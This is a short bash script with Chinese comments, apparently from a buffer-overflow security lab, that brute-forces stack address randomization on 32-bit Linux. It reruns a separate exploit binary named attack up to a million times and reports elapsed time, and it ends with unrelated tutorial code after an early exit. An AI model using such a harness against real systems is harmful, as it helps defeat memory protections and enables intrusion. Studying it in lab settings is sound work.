#!/bin/bash
# do_attack.sh 使用暴力攻击，击破32位计算机的栈随机化机制
# sudo sysctl -w kernel.randomize_va_space=2

SECONDS=0
count=0
maxcount=1000000

while [ $count -lt $maxcount ]
#while [ 1 ]
do
    count=$(( $count + 1 ))
    duration=$SECONDS
    minutes=$(($duration / 60))
    seconds=$(($duration % 60))
    echo "$minutes minutes and $seconds seconds elapsed."
    echo "The program has been running $count times so far."
    ./attack
done

echo "Done"

exit



# https://www.runoob.com/linux/linux-shell-process-control.html
if [ $count -ge $ten ];then
    echo "$count >= $ten"
elif [ $count -lt $ten ];then
    echo "$count < $ten"
fi

exit

